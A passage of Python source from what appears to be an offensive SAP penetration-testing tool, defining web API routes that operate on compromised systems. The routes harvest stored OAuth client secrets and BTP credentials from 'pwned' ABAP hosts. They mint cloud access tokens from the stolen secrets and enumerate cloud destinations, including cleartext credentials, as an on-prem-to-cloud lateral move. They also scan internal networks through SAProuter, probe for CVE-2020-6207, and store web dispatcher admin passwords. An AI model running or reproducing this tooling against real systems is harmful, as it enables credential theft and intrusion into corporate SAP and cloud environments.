                        "HIGH", sid,
                        f"PP impersonation reachable via SCC "
                        f"{used_scc}: {len(matched)} ABAP user(s) "
                        f"on {sid} have a USREXTID entry the cloud "
                        f"caller can claim via the "
                        f"{imp.get('rule_template','?')} rule.",
                        ref="scc.pp.impersonation.unprivileged",
                        meta={"scc_host": used_scc,
                              "matched_count": len(matched)})
            except Exception as e:
                print(f"[-] {sid}: read_usrextid error: {e}")
            finally:
                _task_end(f"{sid}:read_usrextid")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/read_oa2c", method="POST")
    def node_read_oa2c(sid):
        """Read transaction OA2C_CONFIG's tables (OA2C_CLIENT +
        OA2C_CLIENT_EXT) on a pwned ABAP target, populating
        node.oauth2_profiles.  After this finishes, the on-prem ->
        BTP harvester can join each profile to its
        /OA2C/CS_<CLIENT_UUID>_NN secstore entry for a complete
        (client_id, client_secret, token_endpoint) tuple ready to
        mint a BTP token.

        Idempotent — reruns just refresh the list.
        """
        from sap_oa2c import read_oa2c_profiles
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            _oa_sess, _ = resolve_soap_session_for_node(
                api.state, node)
            try:
                profiles = read_oa2c_profiles(
                    node, soap_session=_oa_sess)
            except Exception as e:
                print(f"[-] {sid}: OA2C read failed — {e!s}")
                return
            node.oauth2_profiles = profiles
            n_btp = sum(1 for p in profiles
                         if "hana.ondemand.com"
                            in (p.get("token_endpoint") or ""))
            print(f"[+] {sid}: OA2C read complete — {len(profiles)} "
                  f"profile(s) total, {n_btp} BTP-bound.  Run "
                  f"Harvest BTP Credentials to surface them as mint "
                  f"candidates.")

        _bg(f"{sid}:read_oa2c", "Read OA2C OAuth Profiles", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/harvest_btp_creds", method="POST")
    def node_harvest_btp_creds(sid):
        """Scan a pwned on-prem node for stored BTP-bound credentials
        (SM59 destinations to *.hana.ondemand.com, ABAP RSECTAB
        entries, Java SecStoreFS rows, OA2C OAuth client config).

        Implicit OA2C refresh: every harvest run also re-reads
        transaction OA2C_CONFIG's tables (OA2C_CLIENT + EXT) so the
        operator's single click guarantees node.oauth2_profiles is
        up to date before the matcher runs.  This used to be a
        separate "Read OA2C OAuth Profiles" data-extraction action;
        nobody wanted to think about ordering it correctly, and the
        only thing it produces is harvester input.

        Minting is still a separate, explicit step (operator picks
        which secret to exchange so accidental authentication
        attempts don't fan out)."""
        from sap_onprem_to_btp import harvest_btp_candidates
        from sap_oa2c import read_oa2c_profiles
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        # Clear the AutoPwn skip-if-done flags — the operator explicitly
        # asked for a fresh harvest, so we shouldn't short-circuit here
        # or in the next AutoPwn wave.
        for _attr in ("_btp_harvested_at", "_oa2c_refreshed_at"):
            try:
                delattr(node, _attr)
            except AttributeError:
                pass
        is_abap = "ABAP" in (node.system_type or "").upper()
        if is_abap:
            try:
                _oa_sess, _ = resolve_soap_session_for_node(
                    api.state, node)
                profiles = read_oa2c_profiles(
                    node, soap_session=_oa_sess)
                node.oauth2_profiles = profiles
            except Exception as e:
                print(f"[-] {sid}: implicit OA2C read failed — {e!s}.  "
                      f"Continuing harvest with existing "
                      f"node.oauth2_profiles ({len(node.oauth2_profiles or [])} "
                      f"row(s)).")
        cands = harvest_btp_candidates(api.state, node)
        print(f"[*] {sid}: harvested {len(cands)} BTP credential "
              f"candidate(s) from existing captures")
        return json.dumps({"candidates": cands})

    @app.route("/api/node/<sid>/mint_btp_token", method="POST")
    def node_mint_btp_token(sid):
        """Exchange a captured (uaa_url, client_id, client_secret) for
        a BTP access token via XSUAA's `/oauth/token` and store it in
        api.btp_tokens.  Auto-fires the existing /api/btp/enumerate
        flow against the resulting region so the cloud topology
        appears on the map without a second click.

        Accepts ``from_harvest: true`` to bypass manual cred entry —
        the endpoint runs harvest_btp_candidates inline, picks the
        candidate at ``candidate_index`` (default 0), and mints with
        that.  Lets a script chain harvest → mint without the
        operator having to copy values out of one step's log into
        the next step's YAML.
        """
        from sap_onprem_to_btp import mint_btp_token
        from sap_btp import (extract_region_from_token,
                              decode_token_claims)
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        uaa_url = (data.get("uaa_url") or "").strip()
        client_id = (data.get("client_id") or "").strip()
        client_secret = (data.get("client_secret") or "").strip()

        # `from_harvest: true` mode — auto-pick a candidate from a
        # fresh harvest pass.  Lets the demo playbook run end to
        # end without the operator needing to copy creds out of
        # the harvest log into the mint step.
        from_harvest = data.get("from_harvest", False)
        if isinstance(from_harvest, str):
            from_harvest = from_harvest.lower() in (
                "true", "1", "yes", "on")
        if from_harvest and not (uaa_url and client_id and client_secret):
            from sap_onprem_to_btp import harvest_btp_candidates
            from sap_oa2c import read_oa2c_profiles
            is_abap = "ABAP" in (node.system_type or "").upper()
            if is_abap and not node.oauth2_profiles:
                # Refresh OA2C in case the operator skipped a
                # standalone harvest_btp_creds step.
                try:
                    _oa_sess, _ = resolve_soap_session_for_node(
                        api.state, node)
                    node.oauth2_profiles = read_oa2c_profiles(
                        node, soap_session=_oa_sess)
                except Exception as e:
                    print(f"[-] {sid}: implicit OA2C read failed — "
                          f"{e!s}")
            cands = harvest_btp_candidates(api.state, node)
            idx = int(data.get("candidate_index", 0))
            if not cands:
                return json.dumps({"error":
                    "from_harvest=true but harvest returned 0 "
                    "candidates.  Check that retrieve_rfcs + "
                    "download_secstore have run on this node, "
                    "and that OA2C_CONFIG holds at least one "
                    "*.hana.ondemand.com profile with a matching "
                    "/OA2C/CS_<UUID>_NN secstore secret."})
            if idx >= len(cands):
                return json.dumps({"error":
                    f"candidate_index={idx} out of range "
                    f"(harvester returned {len(cands)} candidates)"})
            picked = cands[idx]
            uaa_url = picked["uaa_url"]
            client_id = picked["client_id"]
            client_secret = picked["client_secret"]
            print(f"[*] {sid}: from_harvest picked candidate "
                  f"#{idx} — {picked.get('source')!r} / "
                  f"{picked.get('label', '?')[:60]} "
                  f"(client_id={client_id[:40]}…, "
                  f"region_hint={picked.get('region_hint', '?')})")
        missing = [name for name, val in (
            ("uaa_url", uaa_url),
            ("client_id", client_id),
            ("client_secret", client_secret),
        ) if not val]
        if missing:
            return json.dumps({"error":
                f"missing required field(s): {', '.join(missing)}.  "
                f"For scripts: did the path: file resolve?  "
                f"For the GUI: every text box must be non-empty."})
        # Catch the obvious "operator copy-pasted the example
        # playbook without filling in placeholders" case so the
        # next error is targeted at the actual cause.
        placeholders = [name for name, val in (
            ("uaa_url", uaa_url),
            ("client_id", client_id),
            ("client_secret", client_secret),
        ) if "<" in val and ">" in val]
        if placeholders:
            return json.dumps({"error":
                f"placeholder syntax (`<…>`) detected in "
                f"{', '.join(placeholders)} — replace with the "
                f"actual values from the harvest output before "
                f"running the mint step."})
        token, err = mint_btp_token(uaa_url, client_id, client_secret)
        if err:
            print(f"[-] {sid}: BTP token mint failed — {err}")
            return json.dumps({"ok": False, "error": err})
        region = extract_region_from_token(token) or ""
        if not region:
            return json.dumps({"ok": False,
                               "error": ("token minted but region could "
                                          "not be derived from iss claim")})
        api.btp_tokens[region] = token
        claims = decode_token_claims(token)
        print(f"[+] {sid}: BTP token minted for region {region!r} "
              f"(cid={claims.get('cid', '?')}, "
              f"sub={claims.get('sub', '?')[:12]}…)")
        # Emit a finding so the lateral move is recorded in the report
        try:
            sapmap_findings.emit_finding(
                "CRITICAL", sid,
                f"On-prem → BTP lateral: minted access token for "
                f"region {region} from credentials harvested off "
                f"{sid}.  Token grants whatever scopes the bound "
                f"service-key carries (typically destination read).",
                ref="onprem.to.btp.token_minted",
                meta={"region": region, "client_id": client_id,
                      "uaa_url": uaa_url})
        except Exception:
            pass

        # Auto-enumerate destinations on the bound subaccount.
        # Default ON because the only useful next step after minting
        # is reading the destinations the token unlocks.  Pass
        # auto_enumerate=false to opt out (e.g. when chaining the
        # explicit btp_pull_destinations_for_token step from a script).
        auto = data.get("auto_enumerate", True)
        if isinstance(auto, str):
            auto = auto.lower() not in ("false", "0", "no", "off")
        enum_result: dict = {}
        if auto:
            try:
                from sap_btp import (
                    pull_destinations_via_destination_token,
                    link_destinations_to_onprem,
                    extract_subaccount_id_from_destination_token,
                    extract_subdomain_from_token,
                )
                from sapmap_models import BTPSubaccountNode
                dests, err, sub_uuid = (
                    pull_destinations_via_destination_token(
                        token, region))
                if err:
                    print(f"[-] {sid}: auto-enumerate after mint "
                          f"failed — {err}")
                    enum_result = {"error": err}
                else:
                    sub_node = api.state.btp_subaccounts.get(sub_uuid)
                    if sub_node is None:
                        sub_node = BTPSubaccountNode(uuid=sub_uuid)
                        api.state.btp_subaccounts[sub_uuid] = sub_node
                    sub_node.region = region
                    sub_node.subdomain = (
                        extract_subdomain_from_token(claims)
                        or sub_node.subdomain)
                    sub_node.enumerated_at = (
                        datetime.now().isoformat())
                    sub_node.destinations = dests
                    # Fold any FQDN-keyed placeholder cloud for the
                    # same subdomain (created earlier by
                    # materialise_type_g_target when an RFC destination
                    # to *.hana.ondemand.com surfaced before harvest).
                    _folded = api.state.fold_btp_placeholders(sub_node)
                    if _folded:
                        print(f"[+] {sid}: folded {_folded} placeholder "
                              f"BTP node(s) into subaccount {sub_uuid[:8]}")
                    before_disc = {
                        s for s, n in api.state.nodes.items()
                        if n.discovered_via_btp}
                    linked = link_destinations_to_onprem(
                        api.state, sub_node)
                    new_disc = [
                        s for s, n in api.state.nodes.items()
                        if n.discovered_via_btp
                           and s not in before_disc]
                    for new_sid in new_disc:
                        if hasattr(api, "_kick_standard_scan"):
                            api._kick_standard_scan(new_sid)
                    captured = sum(1 for d in dests
                                    if d.cleartext_captured)
                    print(f"[+] {sid}: post-mint enumerate — "
                          f"{len(dests)} destination(s), {captured} "
                          f"cleartext, {linked} linked to on-prem "
                          f"(subaccount {sub_uuid[:8]})")
                    enum_result = {
                        "subaccount_uuid": sub_uuid,
                        "destinations": len(dests),
                        "cleartext_captured": captured,
                        "linked_to_onprem": linked,
                    }
            except Exception as e:
                print(f"[-] {sid}: auto-enumerate after mint raised "
                      f"— {e!s}")
                enum_result = {"error": str(e)[:200]}

        return json.dumps({"ok": True, "region": region,
                           "enumerate": enum_result})

    @app.route("/api/node/<sid>/set_type", method="POST")
    def node_set_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_type = data.get("system_type", "").strip()
        if new_type:
            node.system_type = new_type
            # Keep the WD flag in sync with the system_type pick so the
            # ICMAD severity logic + GUI menu gating see consistent
            # state.  Pick WEB_DISPATCHER -> is_web_dispatcher=True;
            # pick any other type -> clear the flag (operator might
            # have mis-flagged it earlier).
            node.is_web_dispatcher = (new_type.upper() == "WEB_DISPATCHER")
            print(f"[*] System type for {sid} set to: {new_type}"
                  + (" (is_web_dispatcher=True)"
                     if node.is_web_dispatcher else ""))
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_db_type", method="POST")
    def node_set_db_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_db = data.get("db_type", "").strip()
        if new_db:
            node.db_type = new_db
            print(f"[*] DB type for {sid} set to: {new_db}")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_os_type", method="POST")
    def node_set_os_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_os = data.get("os_type", "").strip()
        if new_os:
            node.os_type = new_os
            print(f"[*] OS type for {sid} set to: {new_os}")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_sid", method="POST")
    def node_set_sid(sid):
        """Rename a node's SID and rewire every referring field.

        Used to replace placeholder Wxx / UNK_<ip> SIDs (generated by
        the discovery cascade when the dispatcher/gateway/SAPControl
        all failed to leak a real SID) with the correct three-letter
        SAP system ID once the operator has confirmed it.
        """
        response.content_type = "application/json"
        data = request.json or {}
        new_sid = (data.get("new_sid") or "").strip().upper()
        if not (len(new_sid) == 3 and new_sid.isalnum()):
            return json.dumps({"error": "SID must be 3 uppercase "
                                          "alphanumeric characters"})
        err = api.state.rename_node_sid(sid, new_sid)
        if err:
            return json.dumps({"error": err})
        print(f"[*] SID renamed: {sid} -> {new_sid}")
        return json.dumps({"status": "ok", "old_sid": sid,
                            "new_sid": new_sid})

    @app.route("/api/node/<sid>/set_instance_nr", method="POST")
    def node_set_instance_nr(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_nr = (data.get("instance_nr") or "").strip()
        if not (len(new_nr) == 2 and new_nr.isdigit()):
            return json.dumps({"error": "instance_nr must be two digits, e.g. 00"})
        # Conventional SAP per-instance ports — without these on the
        # InstanceInfo, GW-gated actions (RFC System Info, Check GW,
        # Create User via GW) stay greyed out because the front-end
        # checks for a 33NN port flagged as gateway.  Same flavour as
        # the RFC-discovery path that creates new nodes.
        canonical_ports = {
            int(f"32{new_nr}"): "dispatcher",
            int(f"33{new_nr}"): "gateway",
            int(f"36{new_nr}"): "ms",
            int(f"80{new_nr}"): "icm-http",
        }
        if node.instances:
            inst = node.instances[0]
            inst.instance_nr = new_nr
            for p, svc in canonical_ports.items():
                inst.ports.setdefault(p, svc)
        else:
            node.instances.append(InstanceInfo(
                instance_nr=new_nr,
                ip=node.ip or node.hostname or "",
                ports=dict(canonical_ports)))
        print(f"[*] Instance number for {sid} set to: {new_nr}")
        return json.dumps({"status": "ok", "instance_nr": new_nr})

    @app.route("/api/node/<sid>/set_saprouter", method="POST")
    def node_set_saprouter(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_router = data.get("saprouter", "").strip()
        node.saprouter = new_router
        if new_router:
            print(f"[*] SAProuter for {sid} set to: {new_router}")
        else:
            print(f"[*] SAProuter for {sid} removed")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_telnet_override", method="POST")
    def node_set_telnet_override(sid):
        """Set (or clear) a custom host:port for the admin telnet console.

        Use case: the target binds 5NN08 to 127.0.0.1 and the operator
        has an SSH tunnel — setting override to e.g. '127.0.0.1:50008'
        makes the telnet deploy path connect through the tunnel.
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        spec = (data.get("telnet_override") or "").strip()
        node.telnet_override = spec
        if spec:
            print(f"[*] {sid}: telnet override set to {spec!r}")
        else:
            print(f"[*] {sid}: telnet override cleared")
        return json.dumps({"status": "ok",
                            "telnet_override": node.telnet_override})

    @app.route("/api/node/<sid>/router_scan", method="POST")
    def node_router_scan(sid):
        """Scan internal hosts through a SAProuter node.

        POST body (JSON):
            targets      str   IP range/list to scan, e.g. "192.168.2.0/24"
                               Omit or set to "" to auto-fill from router info.
            auto_targets bool  If true, extract targets from node.saprouter_info
                               (the ROUTER_ADM info leak result) and merge with
                               any manually supplied targets.
            inst_from    int   Start of instance number range (default 0)
            inst_to      int   End of instance number range (default 10)
            mode         str   "sap" (default) or "full" (adds HANA + JAVA ports)
            concurrency  int   Simultaneous probes per host (default 10)
            timeout      float Per-probe socket timeout in seconds (default 5)
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        # Build the SAProuter prefix from the node's IP (if it IS the router)
        # or from node.saprouter (if it routes THROUGH a router to this node).
        # A SAProuter node has system_type="SAPROUTER" or port 3299 open.
        router_port = 3299
        for inst in node.instances:
            for port, svc in inst.ports.items():
                if svc == "saprouter" or port == 3299:
                    router_port = port
                    break

        router_ip = node.ip or node.hostname
        if node.saprouter:
            # This node is itself reached via a SAProuter — chain through it
            saprouter_prefix = node.saprouter
        else:
            # This node IS the SAProuter
            saprouter_prefix = f"/H/{router_ip}/S/{router_port}"

        # Collect targets
        target_ips = []
        targets_str = (data.get("targets") or "").strip()
        if targets_str:
            target_ips = sapmap_scanner.parse_targets(targets_str)

        auto_targets = data.get("auto_targets", not bool(targets_str))
        if auto_targets and node.saprouter_info:
            from sapmap_scanner import extract_targets_from_router_info
            router_targets = extract_targets_from_router_info(node.saprouter_info)
            if router_targets:
                print(f"[*] {sid}: Auto-extracted {len(router_targets)} target(s) "
                      f"from router info: {router_targets[:5]}"
                      f"{'...' if len(router_targets) > 5 else ''}")
                # Merge, deduplicate, preserve order
                existing = set(target_ips)
                for t in router_targets:
                    if t not in existing:
                        target_ips.append(t)
                        existing.add(t)

        if not target_ips:
            return json.dumps({"error": "No targets specified and no router info available. "
                                        "Supply a target range or run Router Info first."})

        inst_from   = int(data.get("inst_from", 0))
        inst_to     = int(data.get("inst_to", 10))
        mode        = data.get("mode", "sap")
        concurrency = int(data.get("concurrency", 10))
        timeout     = float(data.get("timeout", 5.0))

        print(f"[*] {sid}: Starting SAProuter internal scan")
        print(f"[*]   Router prefix: {saprouter_prefix}")
        print(f"[*]   Targets: {len(target_ips)}, instances {inst_from:02d}-{inst_to:02d}, "
              f"mode={mode}")

        def _run():
            _task_start(f"{sid}:router_scan", f"Router Scan via {sid}")
            # Clear any stale cancel state from previous scans / STOP presses.
            # Without this, api.cancel_event stays set after a STOP and the
            # very first is_set() inside scan_network_via_saprouter aborts
            # the scan immediately ("Router scan cancelled").
            api.cancel_event.clear()
            try:
                import sapmap_stop
                sapmap_stop.reset_stop()
            except Exception:
                pass
            try:
                nodes = sapmap_scanner.scan_network_via_saprouter(
                    saprouter_prefix=saprouter_prefix,
                    targets=target_ips,
                    instance_range=(inst_from, inst_to),
                    timeout=timeout,
                    concurrency=concurrency,
                    mode=mode,
                    cancel_event=api.cancel_event,
                    node_callback=lambda n: api.state.add_node(n),
                    verbose=True,
                )
                # Add any nodes not yet added via callback
                for n in nodes:
                    if n.sid not in api.state.nodes:
                        api.state.add_node(n)
                print(f"[+] {sid}: Router scan complete — "
                      f"{len(nodes)} system(s) discovered")
            except Exception as e:
                print(f"[-] {sid}: Router scan error: {e}")
                import traceback
                traceback.print_exc()
            finally:
                _task_end(f"{sid}:router_scan")

        _bg(f"{sid}:router_scan", f"Router Scan via {sid}", _run)
        return json.dumps({
            "status": "started",
            "saprouter_prefix": saprouter_prefix,
            "targets": len(target_ips),
            "instances": f"{inst_from:02d}-{inst_to:02d}",
            "mode": mode,
        })

    @app.route("/api/node/<sid>/rfc_system_info", method="POST")
    def node_rfc_system_info(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            # Find gateway port
            gw_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "gateway" or (3300 <= port <= 3399):
                        gw_port = port
                        break
                if gw_port:
                    break
            if not gw_port:
                print(f"[-] No gateway port found for {node.sid}")
                return
            host = node.ip or node.hostname
            if node.saprouter:
                print(f"[*] {node.sid}: Using SAProuter: {node.saprouter}")
            # Pass known instance numbers so SAPControl queries the right one
            inst_nrs = [inst.instance_nr for inst in node.instances
                        if inst.instance_nr is not None]
            info = sapmap_scanner.enrich_system_info(
                host, gw_port, instance_nrs=inst_nrs,
                sid_hint=node.sid, saprouter=node.saprouter)
            # Update node with retrieved info
            if info.get("sid") and not node.sid.startswith("UNK"):
                pass  # keep existing SID
            elif info.get("sid"):
                node.sid = info["sid"]
            if info.get("hostname"):
                node.hostname = info["hostname"]
            if info.get("os_type"):
                node.os_type = info["os_type"]
            if info.get("db_type"):
                node.db_type = info["db_type"]
            if info.get("kernel"):
                node.kernel = info["kernel"]
            if info.get("sap_release"):
                node.sap_release = info["sap_release"]

            # Set system type from SAPControl ABAP/JAVA detection
            sc_abap = info.get("_is_abap", False)
            sc_java = info.get("_is_java", False)
            if sc_abap or sc_java:
                if sc_abap and sc_java:
                    node.system_type = "ABAP+JAVA"
                elif sc_java:
                    node.system_type = "JAVA"
                else:
                    node.system_type = "ABAP"

            # Database port fingerprinting (if DB not yet known)
            if not node.db_type:
                inst_nrs = node.instance_nrs() or ["00"]
                db_ports = []
                for nr in inst_nrs:
                    n = int(nr)
                    db_ports.append((30000 + n * 100 + 13, "HDB"))   # HANA SystemDB
                    db_ports.append((30000 + n * 100 + 15, "HDB"))   # HANA tenant
                db_ports += [(7210, "ADA"), (1433, "MSS"),
                             (1521, "ORA"), (50000, "DB6")]
                print(f"[*] Scanning database ports on {host}...")
                for port, db_name in db_ports:
                    if sapmap_scanner._scan_port(host, port, timeout=2.0):
                        node.db_type = db_name
                        print(f"[+] Database detected: {db_name} "
                              f"(port {port} open on {host})")
                        break
                if not node.db_type:
                    print(f"[*] No database ports detected on {host}")

        _bg(f"{sid}:rfc_system_info", "RFC System Info", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_gw", method="POST")
    def node_check_gw(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_exploit.check_gw_vulnerable(node)

        _bg(f"{sid}:check_gw", "Check Gateway", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_ms", method="POST")
    def node_check_ms(sid):
        """Check MS internal port for CVE-2020-6207 (betrusted vulnerability)."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            print(f"[*] {sid}: Checking MS internal port (CVE-2020-6207 / betrusted)...")
            found = sapmap_scanner.check_ms_betrusted(node)
            if not found:
                print(f"[*] {sid}: MS internal port not found/reachable")
            elif node.ms_vulnerable:
                print(f"[+] {sid}: MS port {node.ms_port} VULNERABLE — betrusted attack possible!")
            elif node.ms_acl_protected:
                print(f"[~] {sid}: MS port {node.ms_port} reachable but ACL-protected")

        _bg(f"{sid}:check_ms", "Check MS Betrusted", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/wd_rediscover", method="POST")
    def node_wd_rediscover(sid):
        """Re-run the WD cache + backend-topology discovery on a node.

        Useful when the operator has changed something on the WD
        (toggled wdisp/cache_enabled, added a wdisp/system_X entry,
        rotated certs) and wants the SAPMAP map updated without a
        full re-scan of every host.  Enabled only when
        node.is_web_dispatcher=True.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if not node.is_web_dispatcher:
            return json.dumps({"error": "Not a Web Dispatcher node"})

        # Find the WD's HTTPS / HTTP port
        wd_port = 0
        wd_https = False
        for inst in node.instances:
            for p, svc in (inst.ports or {}).items():
                low = (svc or "").lower()
                if low.startswith("wd_"):
                    wd_port = p
                    wd_https = low == "wd_https"
                    break
            if wd_port:
                break
        if not wd_port:
            return json.dumps({"error": "No WD port found on node"})

        def _run():
            try:
                from sapmap_scanner import (
                    detect_wd_cache, discover_wd_backends,
                    match_wd_backends_to_nodes,
                )
                host = node.ip or node.hostname
                print(f"[*] {sid}: WD rediscover on {host}:{wd_port}"
                      f"{'/HTTPS' if wd_https else '/HTTP'}")
                # Cache state
                cache = detect_wd_cache(host, wd_port, https=wd_https,
                                          timeout=6,
                                          saprouter=node.saprouter or "")
                node.wd_cache_enabled = bool(cache.get("enabled"))
                node.wd_cache_evidence = cache.get("evidence", "")
                if cache.get("enabled"):
                    print(f"[+] {sid}: cache ENABLED "
                          f"({cache['evidence']})")
                else:
                    print(f"[*] {sid}: cache disabled or no signal "
                          f"({cache.get('evidence', '')})")
                # Backend topology — Server-header bucket
                bk_result = discover_wd_backends(
                    host, wd_port, https=wd_https,
                    timeout=6, saprouter=node.saprouter or "",
                    verbose=True)
                node.wd_backends = [dict(b, linked_node_sid="")
                                      for b in bk_result["backends"]]
                # Chain the admin-table extraction when working
                # wd_admin credentials are stored on the node.  This
                # is the authoritative source — Server-header
                # buckets collapse multiple real backends into one
                # entry; the admin readout splits them apart with
                # real SID + MSHOST + MSPORT.  Without this, every
                # rediscover would revert the map to the bucketed
                # view and re-create the synthetic B-prefix
                # placeholders the operator just got rid of.
                wd_cred = None
                for c in (node.credentials or []):
                    if getattr(c, "kind", "") == "wd_admin":
                        wd_cred = c
                        break
                if wd_cred:
                    print(f"[*] {sid}: stored wd_admin credentials "
                          f"found ({wd_cred.username}) — chaining "
                          f"admin-table extraction")
                    try:
                        from sap_wdisp_admin import fetch_wd_systems
                        r = fetch_wd_systems(
                            host, wd_port, https=wd_https,
                            user=wd_cred.username,
                            pwd=wd_cred.password,
                            timeout=8,
                            saprouter=node.saprouter or "",
                        )
                        if r["ok"]:
                            print(f"[+] {sid}: admin-table parsed "
                                  f"{len(r['systems'])} wdisp/system_*"
                                  f" entry/entries")
                            _enrich_wd_backends_from_admin_table(
                                node, r["systems"], state=api.state)
                        else:
                            print(f"[-] {sid}: admin-table extract "
                                  f"failed ({r['error']}) — falling "
                                  f"back to Server-header bucket "
                                  f"placeholders")
                    except Exception as e:
                        print(f"[-] {sid}: admin-table extract "
                              f"crashed: {type(e).__name__}: {e}")
                # Re-run cross-node matching (link-only mode).
                # Synthetic B-prefix placeholders are NOT auto-created
                # from Server-header buckets — those are too generic
                # to deserve a node on the map.  Real-SID placeholders
                # come from the admin-table extraction above (when
                # wd_admin credentials are stored on the node); the
                # WD's wd_backends list still carries the bucket data
                # for the node-details panel display.
                placeholders = match_wd_backends_to_nodes(
                    list(api.state.nodes.values()),
                    promote_unmatched=False)
                for p in placeholders:
                    api.state.add_node(p)
                if placeholders:
                    print(f"[+] {sid}: linked "
                          f"{len(placeholders)} backend(s) to "
                          f"existing on-map node(s)")
                # Surface linked-node summary
                linked = [b for b in node.wd_backends
                            if b.get("linked_node_sid")]
                print(f"[+] {sid}: rediscover complete — "
                      f"{len(node.wd_backends)} backend(s), "
                      f"{len(linked)} linked to on-map nodes "
                      f"(of which {len(placeholders)} newly "
                      f"synthesised)")
                for b in node.wd_backends:
                    tgt = (b.get("linked_node_sid")
                            or '<not on map>')
                    srv = b.get("server_header") or '<suppressed>'
                    print(f"      → {tgt:8s} [{srv[:60]}] "
                          f"{len(b.get('url_prefixes', []))} prefix(es)")
            except Exception as e:
                import traceback
                print(f"[-] {sid}: WD rediscover failed: "
                      f"{type(e).__name__}: {e}")
                traceback.print_exc()

        _bg(f"{sid}:wd_rediscover", "WD Rediscover (cache + backends)",
              _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/wd_admin_set_credentials", method="POST")
    def node_wd_admin_set_credentials(sid):
        """Save operator-supplied WD admin Basic-auth credentials on
        the node, optionally pulling the wdisp/system_* table right
        after.  The credentials get stored in node.credentials with
        kind='wd_admin' so downstream actions can find them.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if not node.is_web_dispatcher:
            return json.dumps({"error": "Not a Web Dispatcher node"})
        body = request.json or {}
        username = (body.get("username") or "").strip()
        password = body.get("password") or ""
        extract = bool(body.get("extract_systems", False))
        if not username or not password:
            return json.dumps({"error": "username and password required"})
        # Capture WD port + HTTPS flag from the node now (request
        # context is gone inside the background thread).
        wd_port, wd_https = 0, False
        for inst in node.instances:
            for p, svc in (inst.ports or {}).items():
                low = (svc or "").lower()
                if low.startswith("wd_"):
                    wd_port = p
                    wd_https = low == "wd_https"
                    break
            if wd_port:
                break
        if not wd_port:
            return json.dumps({"error": "No WD port found on node"})
        host = node.ip or node.hostname

        def _run():
            try:
                _run_body()
            except Exception as e:
                import traceback
                print(f"[-] {sid}: WD admin set-creds crashed: "
                      f"{type(e).__name__}: {e}")
                traceback.print_exc()

        def _run_body():
            from sap_wdisp_admin import (probe_wd_admin_credentials,
                                            fetch_wd_systems)
            # First probe with ONLY the operator-supplied creds to
            # confirm they work.  probe_wd_admin_credentials auto-flips
            # HTTP↔HTTPS when the configured protocol connection-fails;
            # we capture the resolved protocol so the follow-up
            # fetch_wd_systems call (and the node's port service
            # label) use the right one.
            live, working, attempts, resolved_https = (
                probe_wd_admin_credentials(
                    host, wd_port, https=wd_https,
                    timeout=6, saprouter=node.saprouter or "",
                    creds=[(username, password)],
                )
            )
            if resolved_https != wd_https:
                # Auto-fallback fired — update the node's port label
                # so subsequent operations (Rediscover topology, ICMAD
                # probes, icmauth extraction) use the right protocol.
                _set_wd_port_protocol(node, wd_port, resolved_https)
                print(f"[*] {sid}: WD port {wd_port} protocol auto-"
                      f"corrected to {'wd_https' if resolved_https else 'wd_http'}")
            if live and working:
                # Stash the credential on the node so other actions
                # can re-use it.  Drop any previous wd_admin cred
                # with the same username (keep the freshest).
                node.credentials = [
                    c for c in (node.credentials or [])
                    if not (getattr(c, "kind", "") == "wd_admin"
                            and (getattr(c, "username", "") or "").lower()
                            == working[0].lower())
                ]
                node.credentials.append(Credentials(
                    username=working[0], password=working[1],
                    client="", instance="",
                    verified=True, kind="wd_admin",
                ))
                print(f"[+] {sid}: WD admin credentials saved + "
                      f"verified ({working[0]} / ********)")
                emit_finding(
                    "MEDIUM", sid,
                    f"WD admin credentials operator-supplied + "
                    f"verified ({working[0]}) — full wdisp/system_* "
                    f"table now reachable",
                    cve="",
                )
                if extract:
                    print(f"[*] {sid}: pulling wdisp/system_* table ...")
                    r = fetch_wd_systems(
                        host, wd_port, https=resolved_https,
                        user=working[0], pwd=working[1],
                        timeout=8,
                        saprouter=node.saprouter or "",
                    )
